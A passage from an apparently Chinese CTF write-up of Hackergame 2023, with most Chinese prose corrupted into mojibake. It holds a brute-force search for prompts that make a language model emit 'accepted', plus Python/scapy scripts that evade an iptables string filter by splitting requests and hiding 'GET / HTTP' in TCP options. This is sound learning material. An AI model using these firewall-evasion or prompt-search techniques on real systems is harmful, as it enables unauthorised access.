</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=n>model</span><span class=o>.</span><span class=n>generate</span><span class=p>(</span><span class=n>input_ids</span><span class=p>,</span> <span class=n>num_beams</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=n>max_new_tokens</span><span class=o>=</span><span class=mi>30</span><span class=p>,</span><span class=n>pad_token_id</span><span class=o>=</span><span class=n>tokenizer</span><span class=o>.</span><span class=n>eos_token_id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>output_text</span> <span class=o>=</span> <span class=n>tokenizer</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>output</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>skip_special_tokens</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># if output contains &#34;accepted&#34;, print it</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;accepted&#34;</span> <span class=ow>in</span> <span class=n>output_text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>prompt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>output_text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>()</span>
</span></span></code></pre></div><p>èƒ½æ‰¾åˆ°ä»¥ä¸‹çš„è¾“å…¥è¾“å‡ºå¯¹ï¼š</p><pre tabindex=0><code>atively
atively accepted the challenge.

The little girl was so excited. She had never been asked to do something like this before. She was determined to succeed

Apology
Apology accepted. She was so happy and excited. She thanked the old man and ran off to show her friends her new toy.

The moral of
</code></pre><p>éšæ„è¾“å…¥ä¸€ä¸ªè¿›ç½‘é¡µå³å¯ï¼š</p><pre tabindex=0><code># input
atively

# reply
accepted the challenge.

The little girl was so excited. She had never been asked to do something like this before. She was determined to succeed
ğŸ‰ğŸ‰ğŸ‰ flag2: flag{yOU-@R3-@cCepT3D-tO-C0nt1Nu3-THe-g4M3} ğŸ‰ğŸ‰ğŸ‰
</code></pre><h2 id=æµå¼æ˜Ÿçƒ>æµå¼æ˜Ÿçƒ<a hidden class=anchor aria-hidden=true href=#æµå¼æ˜Ÿçƒ>#</a></h2><p>ä»é¢˜ç›®ç»™çš„è½¬æ¢è„šæœ¬æ¥çœ‹ï¼Œè½¬æ¢è„šæœ¬æŠŠè¾“å…¥çš„è§†é¢‘è½¬æ¢æˆäº†ä¸€ä¸ªn*1çš„numpyæ•°ç»„ï¼Œå› æ­¤å¯ä»¥å†™ä¸€ä¸ªå‡½æ•°ä»è¿™ä¸ªæ•°ç»„é‡Œè½¬æ¢å›å¸§ï¼ˆæ³¨æ„é¢œè‰²é€šé“è¿˜è¦å ç”¨*3ï¼‰ã€‚è¿™ä¸ªè„šæœ¬æ˜¯ç¬”è€…åœ¨å†™äº†æ¡†æ¶ä¹‹åè¯·chatgptå†™çš„ï¼Œæ•ˆæœæ„å¤–çš„ä¸é”™ï¼ˆè‡³å°‘èƒ½ç”¨ï¼‰</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>cv2</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Path to the binary file</span>
</span></span><span class=line><span class=cl><span class=n>binary_file_path</span> <span class=o>=</span> <span class=s2>&#34;video.bin&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Reading the content of the binary file</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>binary_file_path</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>video_data</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>frombuffer</span><span class=p>(</span><span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>(),</span> <span class=n>dtype</span><span class=o>=</span><span class=n>np</span><span class=o>.</span><span class=n>uint8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>restore_video</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>frame_count</span><span class=p>,</span> <span class=n>width</span><span class=p>,</span> <span class=n>height</span><span class=p>,</span> <span class=n>output_file</span><span class=o>=</span><span class=s2>&#34;restored_video.mp4&#34;</span><span class=p>,</span> <span class=n>frame_rate</span><span class=o>=</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    Try to restore the video from the given data using the specified parameters.
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    :param data: NumPy array containing the video data
</span></span></span><span class=line><span class=cl><span class=s2>    :param frame_count: Number of frames in the video
</span></span></span><span class=line><span class=cl><span class=s2>    :param width: Width of each frame
</span></span></span><span class=line><span class=cl><span class=s2>    :param height: Height of each frame
</span></span></span><span class=line><span class=cl><span class=s2>    :param output_file: Name of the output video file
</span></span></span><span class=line><span class=cl><span class=s2>    :return: None
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># Calculate the total number of pixels in the video</span>
</span></span><span class=line><span class=cl>    <span class=n>total_pixels</span> <span class=o>=</span> <span class=n>frame_count</span> <span class=o>*</span> <span class=n>width</span> <span class=o>*</span> <span class=n>height</span> <span class=o>*</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Check if we have enough data to fill the video</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>data</span><span class=o>.</span><span class=n>size</span> <span class=o>&lt;</span> <span class=n>total_pixels</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Not enough data to fill the video. Missing </span><span class=si>{</span><span class=n>total_pixels</span> <span class=o>-</span> <span class=n>data</span><span class=o>.</span><span class=n>size</span><span class=si>}</span><span class=s2> pixels.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Trim the data to fit the video exactly</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;data used percentage:&#34;</span><span class=p>,</span> <span class=n>total_pixels</span> <span class=o>/</span> <span class=n>data</span><span class=o>.</span><span class=n>size</span> <span class=o>*</span> <span class=mi>100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=p>[:</span><span class=n>total_pixels</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Reshape the data to create the video frames</span>
</span></span><span class=line><span class=cl>    <span class=n>frames</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>reshape</span><span class=p>((</span><span class=n>frame_count</span><span class=p>,</span> <span class=n>height</span><span class=p>,</span> <span class=n>width</span><span class=p>,</span> <span class=mi>3</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Define the codec and create a video writer object</span>
</span></span><span class=line><span class=cl>    <span class=n>fourcc</span> <span class=o>=</span> <span class=n>cv2</span><span class=o>.</span><span class=n>VideoWriter_fourcc</span><span class=p>(</span><span class=o>*</span><span class=s2>&#34;mp4v&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>cv2</span><span class=o>.</span><span class=n>VideoWriter</span><span class=p>(</span><span class=n>output_file</span><span class=p>,</span> <span class=n>fourcc</span><span class=p>,</span> <span class=n>frame_rate</span><span class=p>,</span> <span class=p>(</span><span class=n>width</span><span class=p>,</span> <span class=n>height</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Write each frame to the video file</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>frame_count</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>out</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>frames</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=n>astype</span><span class=p>(</span><span class=n>np</span><span class=o>.</span><span class=n>uint8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Release the video writer object</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span><span class=o>.</span><span class=n>release</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Video restored and saved to&#34;</span><span class=p>,</span> <span class=n>output_file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># return first frame</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>frames</span><span class=o>.</span><span class=n>astype</span><span class=p>(</span><span class=n>np</span><span class=o>.</span><span class=n>uint8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Example usage: restore_video(video_data, 300, 640, 480)</span>
</span></span><span class=line><span class=cl><span class=c1># Note: The frame_count, width, and height parameters are just examples and need to be adjusted.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>width</span> <span class=o>=</span> <span class=mi>640</span>
</span></span><span class=line><span class=cl><span class=n>frame_count</span><span class=o>=</span><span class=mi>138</span>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>=</span> <span class=n>restore_video</span><span class=p>(</span><span class=n>video_data_padded</span><span class=p>,</span> <span class=n>frame_count</span><span class=p>,</span><span class=n>width</span> <span class=p>,</span> <span class=mi>510</span><span class=p>,</span> <span class=n>frame_rate</span><span class=o>=</span><span class=mi>10</span><span class=p>)</span>
</span></span></code></pre></div><p>è§†é¢‘çš„é•¿å®½éœ€è¦è‡ªå·±çŒœï¼Œåªè¦å®½åº¦çŒœçš„å·®ä¸å¤šäº†åŸºæœ¬éƒ½èƒ½çœ‹å‡ºflagï¼ˆæ„Ÿè§‰æˆ‘çŒœçš„å®½åº¦ä¼¼ä¹ä¹Ÿä¸å¤ªå¯¹ï¼Œä¸è¿‡å·²ç»èƒ½åˆ†è¾¨å‡ºæ¥äº†ï¼‰ï¼Œå¯ä»¥ä»å¸¸è§çš„è§†é¢‘é•¿å®½é‡Œä¸€ä¸ªä¸€ä¸ªæµ‹è¯•ï¼ˆ<del>ä½†æ²¡æƒ³åˆ°å‡ºé¢˜ç”¨çš„åŸå§‹è§†é¢‘æ˜¯ç«–ç€çš„ï¼Œå› æ­¤çœ‹èµ·æ¥æ¯”è¾ƒæ€ªï¼‰</del>ã€‚</p><p><figure><img loading=lazy src=https://assets.sparktour.me/img/blog/2023/ustc-hackergame-2023-writeup/video-restore.jpg alt="restored video"><figcaption>restored video</figcaption></figure></p><pre tabindex=0><code>flag{it-could-be-easy-to-restore-video-with-haruhikage-even-without-metadata-0F7968CC}
</code></pre><h2 id=ä½å¸¦å®½æ˜Ÿçƒ>ä½å¸¦å®½æ˜Ÿçƒ<a hidden class=anchor aria-hidden=true href=#ä½å¸¦å®½æ˜Ÿçƒ>#</a></h2><h3 id=å°è¯•ç‰›åˆ€>å°è¯•ç‰›åˆ€<a hidden class=anchor aria-hidden=true href=#å°è¯•ç‰›åˆ€>#</a></h3><p>è½¬æ¢æˆsvgå°±è¡Œï¼ˆä½†ä¾ç„¶è¾¾ä¸åˆ°ç¬¬äºŒé—®50byteçš„è¦æ±‚ï¼‰ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-svg data-lang=svg><span class=line><span class=cl><span class=nt>&lt;svg&gt;&lt;path</span> <span class=na>fill=</span><span class=s>&#34;#d92034&#34;</span> <span class=na>d=</span><span class=s>&#34;M0 0h380v1024H0z&#34;</span><span class=nt>/&gt;&lt;path</span> <span class=na>fill=</span><span class=s>&#34;#f1885d&#34;</span> <span class=na>d=</span><span class=s>&#34;M380 0h317v1024H380z&#34;</span><span class=nt>/&gt;&lt;path</span> <span class=na>fill=</span><span class=s>&#34;#d50415&#34;</span> <span class=na>d=</span><span class=s>&#34;M697 0h327v1024H697z&#34;</span><span class=nt>/&gt;&lt;/svg&gt;</span>
</span></span></code></pre></div><p>ç¬”è€…å°è¯•è¿‡çš„å‡ ç§å¸¸è§çš„æ— æŸå‹ç¼©æ ¼å¼è¾“å‡ºçš„å›¾ç‰‡å¤§å°ï¼š</p><table><thead><tr><th>Type</th><th>Size</th></tr></thead><tbody><tr><td>PNG</td><td>~2kb</td></tr><tr><td>AVIF (AV1)</td><td>~2kb</td></tr><tr><td>HEIF (HEVC)</td><td>552b</td></tr><tr><td>WEBP (VP8)</td><td>176b</td></tr><tr><td>EPS</td><td>~300b</td></tr><tr><td>SVG</td><td>170b</td></tr><tr><td>SVGZ (GZIP)</td><td>120b</td></tr></tbody></table><p>ç¬”è€…å½“æ—¶ä¹Ÿå°è¯•äº†JPEG XLå’Œä»–çš„å‰èº«<a href=https://en.wikipedia.org/wiki/Free_Lossless_Image_Format>FLIF</a>ï¼Œä¸è¿‡å°è¯•éƒ½é›†ä¸­åœ¨äº†æ€ä¹ˆè®©ä»–ç”¨ä¸åŒçš„åˆ†è¾¨ç‡ç¼–ç äº®åº¦å’Œé¢œè‰²ä¿¡æ¯ç­‰ï¼Œç°åœ¨çœ‹æ¥åè€Œæ˜¯ç ”ç©¶imagemagickçš„<a href=https://legacy.imagemagick.org/Usage/canvas/>canvas</a>æŒ‡ä»¤æ¯”è¾ƒç¬¦åˆé¢˜ç›®çš„æƒ³æ³•ã€‚</p><h2 id=komm-sÃ¼sser-flagge>Komm, sÃ¼sser Flagge<a hidden class=anchor aria-hidden=true href=#komm-sÃ¼sser-flagge>#</a></h2><h3 id=æˆ‘çš„-post>æˆ‘çš„ POST<a hidden class=anchor aria-hidden=true href=#æˆ‘çš„-post>#</a></h3><p>iptablesçš„string filteråªåœ¨ä¸€ä¸ªåŒ…å†…åŒ¹é…ï¼ŒæŠŠPOå’ŒSTåˆ†å¼€å‘å°±è¡Œã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_http_request</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1># åˆ›å»ºä¸€ä¸ªsocketå¯¹è±¡</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># è¿æ¥åˆ°æœåŠ¡å™¨</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=s2>&#34;202.38.93.111&#34;</span><span class=p>,</span> <span class=mi>18081</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># å‘é€è¯·æ±‚çš„ç¬¬ä¸€éƒ¨åˆ†</span>
</span></span><span class=line><span class=cl>    <span class=n>request_part1</span> <span class=o>=</span> <span class=s2>&#34;PO&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>sendall</span><span class=p>(</span><span class=n>request_part1</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># å‘é€è¯·æ±‚çš„ç¬¬äºŒéƒ¨åˆ†</span>
</span></span><span class=line><span class=cl>    <span class=n>request_part2</span> <span class=o>=</span> <span class=s2>&#34;ST / HTTP/1.1</span><span class=se>\r\n</span><span class=s2>Host: 202.38.93.111:18080</span><span class=se>\r\n</span><span class=s2>Content-Length: 100</span><span class=se>\r\n\r</span><span class=s2>\k=&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>sendall</span><span class=p>(</span><span class=n>request_part2</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># æ¥æ”¶å“åº”</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4096</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># å…³é—­socket</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>send_http_request</span><span class=p>()</span>
</span></span></code></pre></div><h3 id=æˆ‘çš„-p>æˆ‘çš„ P<a hidden class=anchor aria-hidden=true href=#æˆ‘çš„-p>#</a></h3><p>ä¸çŸ¥é“ä¸ºå•¥ï¼Œç”¨ç¬¬ä¸€é—®çš„ä»£ç ä¹Ÿè¿‡äº†ã€‚</p><h3 id=æˆ‘çš„-getéé¢„æœŸ>æˆ‘çš„ GETï¼ˆéé¢„æœŸï¼‰<a hidden class=anchor aria-hidden=true href=#æˆ‘çš„-getéé¢„æœŸ>#</a></h3><pre tabindex=0><code>-A myTCP-3 -p tcp -m string --algo bm --from 0 --to 50 --string &#34;GET / HTTP&#34; -j ACCEPT
-A myTCP-3 -p tcp -j REJECT --reject-with tcp-reset
</code></pre><p>è¿™ä¸¤è¡Œiptablesçš„æ„æ€å¤§æ¦‚æ˜¯åªå…è®¸åŒ…å‰50ä¸ªbyteå«æœ‰<code>GET / HTTP</code>çš„åŒ…é€šè¿‡ï¼Œå› æ­¤æˆ‘ä»¬åœ¨SYNï¼ŒSYNACKçš„æ—¶å€™éƒ½éœ€è¦æŠŠ<code>GET / HTTP</code>å¡è¿›åŒ…é‡Œé¢ã€‚ç¬”è€…å°è¯•ç”¨<code>scapy</code>æ„é€ äº†TCPåŒ…ã€‚</p><p>æœ€å¼€å§‹ç¬”è€…æ‰“ç®—ç”¨HTTP Pipeliningï¼Œåœ¨å‘SYNACKçš„æ—¶å€™ç›´æ¥æŠŠGETå’ŒPOSTä¸€èµ·å‘è¿‡å»ï¼Œä¸è¿‡å‘ç°goçš„httpåº“ä¼¼ä¹ä¸å¤ªæ”¯æŒè¿™æ ·çš„è¡Œä¸ºï¼Œåªèƒ½è¿”å›ç¬¬ä¸€ä¸ªGETçš„ç»“æœï¼Œå› æ­¤åæ¥å°è¯•äº†æŠŠ<code>GET / HTTP</code>å¡è¿›TCP Optionsé‡Œï¼ˆç¬”è€…ä¹Ÿå°è¯•è¿‡å¡IP Optionsé‡Œï¼Œä¸è¿‡optionä¼¼ä¹ä¼šè¢«é“¾è·¯ä¸Šçš„æŸäº›è·¯ç”±å™¨ä¸¢æ‰ï¼Œæ‰€ä»¥å°±æ”¹ç”¨äº†TCP Optionsäº†ï¼‰ï¼Œè¿™æ ·å€’ä¹Ÿä¸ä¼šè®©é‚£ä¸ªgoç¨‹åºæŠŠè¯¯è®¤ä¸ºæˆ‘åœ¨GETäº†ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>scapy.all</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=c1># è®¾ç½®ç›®æ ‡IPå’Œç«¯å£</span>
</span></span><span class=line><span class=cl><span class=n>sport</span> <span class=o>=</span> <span class=mi>13377</span>
</span></span><span class=line><span class=cl><span class=n>dport</span> <span class=o>=</span> <span class=mi>18082</span>
</span></span><span class=line><span class=cl><span class=n>src</span> <span class=o>=</span> <span class=s2>&#34;SRC-IP&#34;</span>
</span></span><span class=line><span class=cl><span class=n>dst</span> <span class=o>=</span> <span class=s2>&#34;202.38.93.111&#34;</span>
</span></span><span class=line><span class=cl><span class=n>iface</span> <span class=o>=</span> <span class=s2>&#34;eth0&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pld</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;GET / HTTP&#34;</span>
</span></span><span class=line><span class=cl><span class=n>tcpopt</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xfa</span><span class=si>%s%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>((</span><span class=nb>len</span><span class=p>(</span><span class=n>pld</span><span class=p>)</span><span class=o>+</span><span class=mi>2</span><span class=p>)</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(),</span> <span class=n>pld</span><span class=p>)</span> <span class=c1># length 12</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ether</span> <span class=o>=</span> <span class=n>Ether</span><span class=p>(</span><span class=nb>type</span><span class=o>=</span><span class=mh>0x800</span><span class=p>,</span> <span class=n>dst</span><span class=o>=</span><span class=s2>&#34;MAC ADDR&#34;</span><span class=p>,</span> <span class=n>src</span><span class=o>=</span><span class=s2>&#34;MAC ADDR&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ip</span> <span class=o>=</span> <span class=n>IP</span><span class=p>(</span><span class=n>src</span><span class=o>=</span><span class=n>src</span><span class=p>,</span> <span class=n>dst</span><span class=o>=</span><span class=n>dst</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>seqstart</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>1000</span><span class=p>,</span><span class=mi>5000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># æ„å»ºå¹¶å‘é€SYNåŒ…</span>
</span></span><span class=line><span class=cl><span class=n>SYN</span> <span class=o>=</span> <span class=n>TCP</span><span class=p>(</span><span class=n>sport</span><span class=o>=</span><span class=n>sport</span><span class=p>,</span> <span class=n>dport</span><span class=o>=</span><span class=n>dport</span><span class=p>,</span> <span class=n>flags</span><span class=o>=</span><span class=s1>&#39;S&#39;</span><span class=p>,</span> <span class=n>seq</span><span class=o>=</span><span class=n>seqstart</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>xsyn</span> <span class=o>=</span> <span class=n>ether</span> <span class=o>/</span> <span class=n>ip</span> <span class=o>/</span> <span class=n>SYN</span> <span class=o>/</span> <span class=s2>&#34;GET / HTTP&#34;</span>
</span></span><span class=line><span class=cl><span class=n>packet</span> <span class=o>=</span> <span class=n>xsyn</span><span class=o>.</span><span class=n>build</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>sendp</span><span class=p>(</span><span class=n>packet</span><span class=p>,</span> <span class=n>iface</span><span class=o>=</span><span class=n>iface</span><span class=p>,</span> <span class=n>verbose</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ç›´æ¥æ¥æ”¶ä»ç›®æ ‡IPåœ°å€è¿”å›çš„ç¬¬ä¸€ä¸ªåŒ…</span>
</span></span><span class=line><span class=cl><span class=n>syn_ack</span> <span class=o>=</span> <span class=n>sniff</span><span class=p>(</span><span class=n>iface</span><span class=o>=</span><span class=n>iface</span><span class=p>,</span> <span class=nb>filter</span><span class=o>=</span><span class=sa>f</span><span class=s2>&#34;ip src </span><span class=si>{</span><span class=n>dst</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>count</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=ow>not</span> <span class=n>syn_ack</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;SYN-ACK not received.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>syn_ack</span> <span class=o>=</span> <span class=n>syn_ack</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>syn_ack</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># æ„å»ºå¹¶å‘é€ACKåŒ…</span>
</span></span><span class=line><span class=cl><span class=n>ACK</span> <span class=o>=</span> <span class=n>TCP</span><span class=p>(</span><span class=n>sport</span><span class=o>=</span><span class=n>sport</span><span class=p>,</span> <span class=n>dport</span><span class=o>=</span><span class=n>dport</span><span class=p>,</span> <span class=n>flags</span><span class=o>=</span><span class=s1>&#39;A&#39;</span><span class=p>,</span> <span class=n>seq</span><span class=o>=</span><span class=n>syn_ack</span><span class=p>[</span><span class=n>TCP</span><span class=p>]</span><span class=o>.</span><span class=n>ack</span><span class=p>,</span> <span class=n>ack</span><span class=o>=</span><span class=n>syn_ack</span><span class=p>[</span><span class=n>TCP</span><span class=p>]</span><span class=o>.</span><span class=n>seq</span> <span class=o>+</span> <span class=mi>1</span><span class=p>,</span> <span class=n>options</span><span class=o>=</span><span class=p>[(</span><span class=mi>66</span><span class=p>,</span> <span class=s2>&#34;GET / HTTP&#34;</span><span class=p>),</span> <span class=p>(</span><span class=s2>&#34;EOL&#34;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)])</span>
</span></span><span class=line><span class=cl><span class=n>http_payload</span> <span class=o>=</span> <span class=s2>&#34;GET / HTTP/1.1</span><span class=se>\r\n</span><span class=s2>Host: a</span><span class=se>\r\n\r\n</span><span class=s2>POST / HTTP/1.1</span><span class=se>\r\n</span><span class=s2>X-A: GET / HTTP</span><span class=se>\r\n</span><span class=s2>Host: srv</span><span class=se>\r\n</span><span class=s2>Content-Length: 15</span><span class=se>\r\n</span><span class=s2>114514:asdfgh==</span><span class=se>\r\n\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>xack</span> <span class=o>=</span> <span class=n>ether</span> <span class=o>/</span> <span class=n>ip</span> <span class=o>/</span> <span class=n>ACK</span> <span class=o>/</span> <span class=n>http_payload</span>
</span></span><span class=line><span class=cl><span class=n>sendp</span><span class=p>(</span><span class=n>xack</span><span class=o>.</span><span class=n>build</span><span class=p>(),</span> <span class=n>iface</span><span class=o>=</span><span class=n>iface</span><span class=p>,</span> <span class=n>verbose</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></div><p>åœ¨è¿è¡Œä¹‹å‰å¯èƒ½éœ€è¦ç”¨iptablesä¸¢æ‰å®¢æˆ·ç«¯å¾€æœåŠ¡ç«¯å‘çš„RSTå’ŒæœåŠ¡ç«¯å¾€å®¢æˆ·ç«¯å‘çš„RSTï¼Œä»¥å…è®©å®¢æˆ·ç«¯å‘å‡ºçš„resetï¼ˆæ£€æµ‹åˆ°ä¸è§„èŒƒçš„tcpåŒ…æ—¶å®¢æˆ·ç«¯ä¼šå‘å‡ºï¼‰å½±å“æœåŠ¡ç«¯ï¼Œå¯å‚è€ƒ<a href=https://stackoverflow.com/questions/13215135/how-to-make-all-outgoing-rst-drop>linux - How to make all outgoing RST drop - Stack Overflow</a></p><h2 id=ä¸ºä»€ä¹ˆè¦æ‰“å¼€-flag->ä¸ºä»€ä¹ˆè¦æ‰“å¼€ /flag ğŸ˜¡<a hidden class=anchor aria-hidden=true href=#ä¸ºä»€ä¹ˆè¦æ‰“å¼€-flag->#</a></h2><h3 id=ld_preload-love>LD_PRELOAD, love!<a hidden class=anchor aria-hidden=true href=#ld_preload-love>#</a></h3><p>æ ¹æ®é¢˜ç›®æœ¬èº«çš„æç¤ºï¼Œè¿™é¢˜å¯èƒ½å’Œå‡ºé¢˜äººç¼–è¯‘çš„é‚£ä¸ªsoæ–‡ä»¶è¢«åŠ è¿›äº†<code>LD_PRELOAD</code>æœ‰å…³ï¼Œé‚£æˆ‘ä»¬æäº¤ä¸Šå»çš„ç¨‹åºåˆ»æ„æ— è§†ä»–å°±è¡Œã€‚<em>è¿™é“é¢˜ç”±äºç¬”è€…ä¸å¤ªæ‡‚ç³»ç»Ÿè°ƒç”¨ï¼Œå› æ­¤è¿™æ ·é—®äº†chatgpt</em>ï¼š</p><pre tabindex=0><code>```
stage1.soçš„ä»£ç 
```
